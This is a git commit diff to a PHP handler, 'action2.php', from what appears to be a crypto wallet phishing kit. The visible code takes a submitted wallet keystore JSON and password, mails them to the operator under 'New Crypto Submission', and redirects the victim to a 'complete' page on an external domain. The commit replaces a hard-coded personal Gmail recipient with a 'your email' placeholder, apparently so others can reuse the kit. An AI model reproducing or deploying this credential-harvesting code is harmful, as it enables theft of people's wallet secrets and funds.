bcad5dc2ac54d533073065eea734213f33b740ad
Phoenixlord29 <geofferychidera29@gmail.com>
2025-01-25 21:20:34 +0100

    action2.php

--- details/action2.php
+++ details/action2.php
@@ -10,7 +10,7 @@ $msg =  "Keystore Json Value: ".$d." \n Password: ".$e;
 $msg = wordwrap($msg,70);
 
 // send email
-mail("geofferychidera29@gmail.com","New Crypto Submission",$msg);
+mail("your email","New Crypto Submission",$msg);
 
 header("Location: ://connectnowonline.online/complete");
 die();
